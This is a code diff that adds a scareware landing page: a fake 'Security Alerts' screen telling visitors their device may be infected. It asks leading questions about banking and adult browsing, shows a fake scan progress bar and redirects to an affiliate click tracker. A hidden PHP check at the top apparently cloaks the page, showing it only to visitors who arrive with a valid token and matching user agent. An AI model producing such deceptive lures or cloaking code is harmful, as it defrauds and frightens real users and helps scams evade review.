@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<?php $key="0b75741389c2bec2524aeb5732d7f186";$a=@$_GET["lpkey"];$b=substr($a,0,2).substr($a,4,2).substr($a,8,2).substr($a,12,2).substr($a,16,2);$c=substr($a,2,2).substr($a,6,2).substr($a,10,2).substr($a,14,2);$d=md5($key.$_SERVER["HTTP_USER_AGENT"].$b);$d=substr($d,2,2).substr($d,7,2).substr($d,12,2).substr($d,24,2);if(time()>$b || $d!==$c){exit(0);}?>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<link rel="stylesheet" href="style.css">
+<head><base >
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Security Alerts</title>
+
+    <script>
+      const link_redirect = 'https://leadsboostin.com/click.php?lp=1';
+    </script>
+  </head>
+  <body style="opacity: 1;">
+
+    <div class="container spacer-top-3">
+      <div class="head-wrapper" onclick="goto()">
+        <img src="images/logo.png" alt="" class="b-logo spacer-bottom-2 spacer-top-3 block-cntr">
+        <h1 class="page-heading spacer-bottom-3 ml-page-heading">Your device may be infected with <span>Adware or Malware</span></h1>
+      </div>
+
+      <div class="b-questions">
+        <div class="b-questions__list">
+          <div class="b-questions__item">
+            <div class="b-questions__item-text ml-question-1">1. Are you seeing multiple suspicious notifications on your phone?</div>
+            <div class="b-questions__item-options-list">
+              <div class="b-questions__item-option">
+                <input name="question-1" type="radio" class="b-questions__item-option-control">
+                <span class="ml-question-option-yes" id="question-option-yes">Yes</span>
+              </div>
+              <div class="b-questions__item-option">
+                <input name="question-1" type="radio" class="b-questions__item-option-control">
+                <span class="ml-question-option-no">No</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="b-questions__item">
+            <div class="b-questions__item-text ml-question-2">2. Are you experiencing system slowdown?</div>
+            <div class="b-questions__item-options-list">
+              <div class="b-questions__item-option">
+                <input name="question-2" type="radio" class="b-questions__item-option-control">
+                <span class="ml-question-option-yes" id="question-option-yes">Yes</span>
+              </div>
+              <div class="b-questions__item-option">
+                <input name="question-2" type="radio" class="b-questions__item-option-control">
+                <span class="ml-question-option-no">No</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="b-questions__item">
+            <div class="b-questions__item-text ml-question-3">3. Do you use your device for Phone/Online Banking or Browsing Adult Content?</div>
+            <div class="b-questions__item-options-list">
+              <div class="b-questions__item-option">
+                <input name="question-3" type="radio" class="b-questions__item-option-control">
+                <span class="ml-question-option-yes" id="question-option-yes">Yes</span>
+              </div>
+              <div name="question-3" class="b-questions__item-option">
+                <input type="radio" class="b-questions__item-option-control">
+                <span class="ml-question-option-no">No</span>
+              </div>
+            </div>
+
+          </div>
+          <div class="b-questions__item">
+            <div class="b-questions__item-text ml-question-4">4. Have you clicked any ads for the past 24 hours?</div>
+            <div class="b-questions__item-options-list">
+              <div class="b-questions__item-option">
+                <input name="question-4" type="radio" class="b-questions__item-option-control">
+                <span class="ml-question-option-yes">Yes</span>
+              </div>
+              <div class="b-questions__item-option">
+                <input name="question-4" type="radio" class="b-questions__item-option-control">
+                <span class="ml-question-option-no">No</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <div class="result-wrapper" onclick="goto()">
+        <div class="b-results spacer-bottom-3">
+          <div class="b-results__heading spacer-bottom-3 ml-analyze-results">Analyzing Your Results... Based on your answers you might be at risk and we recommend quick Antivirus Scan.</div>
+
+          <div class="b-progress-bar spacer-bottom-3">
+            <div class="b-progress-bar__done" style="width: 0%;"></div>
+          </div>
+
+          <div class="b-results__alert ml-warning">* Do Not Leave The Page or Reload The Page... <br>*** We are redirecting you to Antivirus page...</div>
+        </div>
+
+        <div class="b-security-note spacer-bottom-3 ml-note">Security Note: Malware is known to steal information from your device and use your identity to do malicious transactions.</div>
+      </div>
+    </div>
+
+    <script src="url_methods.js"></script>
+
+    <script src="html_methods.js"> </script>
+
+    <script src="images/ml.js"></script>
+    <script src="questions.js"></script>
+    <script src="myscript.js"></script>
+
+  </body>
+
+</html>
